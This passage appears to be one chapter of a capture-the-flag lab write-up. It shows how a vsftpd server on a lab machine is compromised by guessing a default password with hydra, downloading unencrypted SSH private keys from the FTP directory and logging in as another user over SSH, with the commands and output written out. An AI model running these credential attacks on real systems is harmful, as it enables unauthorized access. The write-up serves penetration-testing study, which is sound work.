# 04 — FTP: default credentials and exposed SSH keys

Chapter 03 produced a username (`kiero`) and a statement that its password is "the default value".
This chapter cashes that in.

---

## 4.1 Anonymous access — ruled out properly

```bash
ftp -n -v 192.168.245.149 <<'EOF'
user anonymous anonymous@test.com
ls -la
pwd
bye
EOF
```

```
Connected to 192.168.245.149.
220 (vsFTPd 3.0.5)
530 Permission denied.
Login failed.
530 Please login with USER and PASS.
530 Please login with USER and PASS.
ftp: Can't bind for data connection: Address already in use
221 Goodbye.
```

**Reading it:** `530 Permission denied` arrives immediately after the `USER anonymous` line, before
any password is offered. In vsftpd that is the signature of `anonymous_enable=NO` — the server
rejects the username outright rather than failing authentication later. No point pursuing it.

(That `Can't bind for data connection: Address already in use` line is a client-side artifact of
running the interactive client from a script, not a server response — ignore it.)

## 4.2 Applying the hint

The SNMP description said `kiero`'s password is reset to *the default value*. The brute-force step
is therefore small and targeted, not a dictionary attack. A short list of plausible defaults, and
critically, **the account name as the password** — the most common "default" on lab images.

```bash
printf "kiero\njohn\n" > users.txt
printf "kiero\nKiero\nkiero123\nKiero123\njohn\nJohn\njohn123\npassword\nPassword123\nPassword123!\nPassword1\nWelcome1\nchangeme\nP@ssw0rd\noffsec\nubuntu\ntoor\n123456\n" > pass.txt

hydra -L users.txt -P pass.txt -t 4 -f -V ftp://192.168.245.149
```

```
[21][ftp] host: 192.168.245.149   misc: (null)   login: kiero   password: kiero
```

**Reading it:** `kiero:kiero` — account name as password. That is the "default value" the SNMP
extend was describing. `-f` stops at the first hit, `-t 4` keeps the concurrency low so vsftpd's
per-IP connection limits are not tripped (a common cause of false negatives on FTP).

> Before this, a hand-rolled loop of ten `curl -u` credential pairs (ftp:ftp, admin:admin,
> user:user, test:test, offsec:offsec, kali:kali, ubuntu:ubuntu, root:root, ftpuser:ftpuser,
> www-data:www-data) all failed — the account-specific default was the answer, which is exactly
> what the SNMP hint was steering toward.

## 4.3 What is in the directory

```bash
curl -s -u kiero:kiero "ftp://192.168.245.149/"
```

```
-rwxr-xr-x    1 114      119          2590 Nov 21  2022 id_rsa
-rw-r--r--    1 114      119           563 Nov 21  2022 id_rsa.pub
-rwxr-xr-x    1 114      119          2635 Nov 21  2022 id_rsa_2
```

**Reading it — this is the real finding:**

- **Two unencrypted SSH private keys** sitting in a directory reachable by an FTP login. `id_rsa`
  is even world-executable (`-rwxr-xr-x`), which is nonsense for key material and suggests a
  careless copy.
- Numeric owner `114:119` = `ftp:ftp`. That places the directory at `/srv/ftp` — vsftpd's default
  anonymous root — not in `kiero`'s home. Confirmed later from the shell:
  ```
  drwxr-xr-x 3 root root 4096 Nov 21  2022 /srv
  drwxr-xr-x 2 ftp  ftp  4096 Nov 22  2022 /srv/ftp
  ```
- Timestamps `Nov 21 2022` match the box build date and the Apache `index.html`. Pre-seeded, not
  dropped by a user.
- **The keys belong to a different account than the one we logged in as.** That is the design
  flaw: `kiero` is a low-value FTP account, and its directory contains `john`'s SSH key. One weak
  password therefore compromises a second, more useful identity — privilege separation between
  accounts is broken.

## 4.4 Identifying the keys before using them

Never point an unknown key at a host blindly; identify it first.

```bash
mkdir -p ftp_kiero && cd ftp_kiero
for f in id_rsa id_rsa.pub id_rsa_2; do
  curl -s -u kiero:kiero -o "$f" "ftp://192.168.245.149/$f"
done
chmod 600 id_rsa id_rsa_2

ssh-keygen -l -f id_rsa
ssh-keygen -l -f id_rsa_2
cat id_rsa.pub
```

```
3072 SHA256:npk65kQbEjxsMC10v9qv/Lg6BU/q1vdeJLYw0C732p4 john@oscp (RSA)
3072 SHA256:G7ci1SZ5dtLiavXDWI4flL1pXn5i0a5TN9fTUhY5FWA no comment (RSA)

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8J1/BFjH/Oet/zx+bKUUop1IuGd93QKio7Dt7Xl/...
  ...XxVEK8oO3qu2pxa/e4izXBFc= john@oscp
```

**Reading it:**

- `id_rsa` — 3072-bit RSA with comment **`john@oscp`**. The comment tells you the username and the
  build. `chmod 600` is required or OpenSSH refuses to use it ("UNPROTECTED PRIVATE KEY FILE").
- `id_rsa_2` — 3072-bit RSA, **no comment**. Unknown owner. Test it, but expect it to be a decoy:
  keys placed in a challenge directory are often one working key plus one that is not in any
  `authorized_keys`.
- The public key file matches `id_rsa`, confirming the pair.

## 4.5 Testing the keys

Try the obvious username for the commented key first.

```bash
ssh -i id_rsa -o BatchMode=yes -o StrictHostKeyChecking=no john@192.168.245.149 'id'
```

```
uid=1000(john) gid=1000(john) groups=1000(john)
```

And confirm the decoy is a decoy (this is worth doing so you can state it as a fact):

```bash
ssh -i id_rsa_2 -o BatchMode=yes -o StrictHostKeyChecking=no john@192.168.245.149 'id'
ssh -i id_rsa_2 -o BatchMode=yes -o StrictHostKeyChecking=no kiero@192.168.245.149 'id'
```

```
john@192.168.245.149: Permission denied (publickey,password,keyboard-interactive).
kiero@192.168.245.149: Permission denied (publickey,password,keyboard-interactive).
```

**Reading it:** `id_rsa` is the working key; `id_rsa_2` is not in either account's
`authorized_keys`. Also note the server advertises `publickey,password,keyboard-interactive` — the
FTP password `kiero:kiero` was tested against SSH too and rejected, so the two services have
separate credentials and the FTP password alone is not an SSH entry point.

---

## Result of this chapter

| Artefact | Value |
|---|---|
| FTP credential | `kiero:kiero` |
| Exposure | two unencrypted RSA private keys in `/srv/ftp` |
| Working key | `id_rsa` → `john@oscp` |
| Decoy | `id_rsa_2` (no comment, not authorized anywhere) |
| Design flaw | weak FTP account's directory contains a *different* user's SSH key |

→ [05 — Foothold](05-foothold.md)
